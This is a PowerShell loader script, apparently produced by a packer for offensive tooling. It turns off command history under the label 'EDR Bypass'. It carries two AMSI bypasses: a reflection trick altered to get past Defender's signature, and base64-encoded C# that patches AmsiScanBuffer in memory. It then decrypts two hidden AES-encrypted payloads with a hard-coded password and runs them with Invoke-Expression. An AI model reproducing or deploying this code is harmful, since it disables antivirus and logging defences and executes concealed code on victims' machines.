$EncFunc0 = ("wyYzf3KSXlCy8L31MU/fmA==", "w4txVNbFB+H5Ek1QIZNHwTBcXa0tZZt5K5luBMGwFEhUyN+swDq5bmvOcEqinKAfaZ9XpL0m3BVgFziWDzlykR2cJrMT3JavxR77lgmsK7bq9vjogJVu+ZCsMRq2xck6e+8NZ8ld4Pt0y65bpnZEFbyOJE5ZqofRokqM6WRrz9gSORMrcQnJjrEIJeSw8XNAOrqitIr4R+tI4Ds7liS0r5kYVcHjcF+3UhqdzsFJHbqZJqEYabu34HOyFmM0EHSJ7PAx8a77uDyPAQgHi/Vx1D0pMAw3iA0NuoLcwkAeZg4ZQE9BJBu4u8YBdmx0H+pu4jLuJBi2U/X6YWwwuyn35d4XlHwWMFjwLcblSoni8vwyzsJheblkqAlHyF4C4y9jG5Wttyh80EO1gAAL9dSNewyq9eLNlmf7LwA7oVOsi4iY0OuxRQucGxu0Wq6t1P2iX9LhqHd4wDMp+M20AuKSuV3CCELFx2DA98Hadf6x95XucsoVvu+nYIlz79rkwtNGkHNbrptR29vdNWx4R+0Izm6Vm5+aKIXAEZAVd9/zOVEHGHuf+dHq6afW8jyHgm6ZG1Ihoj7tuZAaKCWUkJK9X6Et4UZMazrm1CGMXbdB5qG5/P0cqbW9MCPU2pm7bfBRofzSKGIJ0XiTAWzxXuLT/5trDTE4+4Am/b5mUwqD3BUcQtywC4oGaDZY3/Cu8KtiIIQE/DfaN23aQbt/CMugixzJXqy96MD+/ByvsZDXTgfD/6pzvXdnhpu2vvAwr50RYwSN2wsDyIpQC7XPgVAHal8wCJvI0znGGb1UZMZocfwResrA+3Y+NPxs81H9J75H32EwLJKOSen6h6tgyAfJuJSzNNf0qh8NIt7CTNpItnsNspCshZvSXuurSeieqk9sgEQXvQVVMwR22QDrCrb/6s8JRdU5SfmzqJolDkJP1y6NYqBqwlHHIwmMx3WkN5BKc4FJc1BgKiX8Kqc0LO75bz4Pf8cX/IXyGF8SWlx6vAcGX0bF6CmhBv0Yr0/yvhdb")
$EncFunc1 = ("RzcPy1Fjvf37VRSF8ePK+A==", "G6skEuSqlhhpka4gPfnhmsTeh0/xTTKhVvPtwH6fZrMPsGqYZmkM6qizbrIzl6rV")
$EncryptedFunctions = @($EncFunc0,$EncFunc1)
$Password="8b<Q!;F3P>"
$Salt="q9o8ZVwYU;"
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

#AMSI Bypass 2
$AMSIBypass2encoded = "dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoADQAKAG4AYQBtAGUAcwBwAGEAYwBlACAAUgBhAG4AZABvAG0ATgBhAG0AZQBzAHAAYQBjAGUADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABSAGEAbgBkAG8AbQBDAGwAYQBzAHMADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIASwBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAFIAdABsAE0AbwB2AGUATQBlAG0AbwByAHkAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAZgBhAGwAcwBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAATQBvAHYAZQBNAGUAbQBvAHIAeQAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAASQBuAHQAUAB0AHIAIABzAHIAYwAsACAAaQBuAHQAIABzAGkAegBlACkAOwANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAFIAYQBuAGQAbwBtAEYAdQBuAGMAdABpAG8AbgAoACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAYQByAGcAZQB0AEQATABMACAAPQAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoACIAYQBtAHMAaQAuAGQAbABsACIAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAbwB0AGEAbABsAHkATgBvAHQAVABoAGEAdABCAHUAZgBmAGUAcgBZAG8AdQBSAEwAbwBvAGsAaQBuAGcARgBvAHIAUAB0AHIAIAA9ACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAVABhAHIAZwBlAHQARABMAEwALAAgACIAQQBtAHMAaQAiACAAKwAgACIAUwBjAGEAbgAiACAAKwAgACIAQgB1AGYAZgBlAHIAIgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUAIAA9ACAAKABVAEkAbgB0AFAAdAByACkANQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAWgBlAHIAbwAgAD0AIAAwADsADQAKACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACwAIABkAHcAUwBpAHoAZQAsACAAMAB4ADQAMAAsACAAbwB1AHQAIABaAGUAcgBvACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIABvAG4AZQAgAD0AIAB7ACAAMAB4ADMAMQAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIAB0AHcAbwAgAD0AIAB7ACAAMAB4AGYAZgAsACAAMAB4ADkAMAAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAHQAIABsAGUAbgBnAHQAaAAgAD0AIABvAG4AZQAuAEwAZQBuAGcAdABoACAAKwAgAHQAdwBvAC4ATABlAG4AZwB0AGgAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgB5AHQAZQBbAF0AIABzAHUAbQAgAD0AIABuAGUAdwAgAGIAeQB0AGUAWwBsAGUAbgBnAHQAaABdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AbgBlAC4AQwBvAHAAeQBUAG8AKABzAHUAbQAsADAAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHcAbwAuAEMAbwBwAHkAVABvACgAcwB1AG0ALABvAG4AZQAuAEwAZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACAAPQAgAE0AYQByAHMAaABhAGwALgBBAGwAbABvAGMASABHAGwAbwBiAGEAbAAoADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBDAG8AcAB5ACgAcwB1AG0ALAAgADAALAAgAHUAbgBtAGEAbgBhAGcAZQBkAFAAbwBpAG4AdABlAHIALAAgADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AbwB2AGUATQBlAG0AbwByAHkAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACAAKwAgADAAeAAwADAAMQBiACwAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACwAIAAzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAfQA="
$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($AMSIBypass2encoded))
Add-Type -TypeDefinition $AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()
if($Password -and $Salt)
{
$Index = 0
foreach($ef in $EncryptedFunctions)
{

[byte[]]$CipherText = [Convert]::FromBase64String($ef[1])
[byte[]]$InitVector = [Convert]::FromBase64String($ef[0])

$AES = [System.Security.Cryptography.Aes]::Create()

$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)
$AES.IV = $InitVector

$AESDecryptor = $AES.CreateDecryptor()

$MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
$StreamReader = New-Object System.IO.StreamReader($CryptoStream)

$Message = $StreamReader.ReadToEnd()

$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

try {$Message | Invoke-Expression } catch { Write-Warning "Error loading function number $Index. Beware that this only affects the mentioned function so everything else should work fine." }

$Index++
}
}
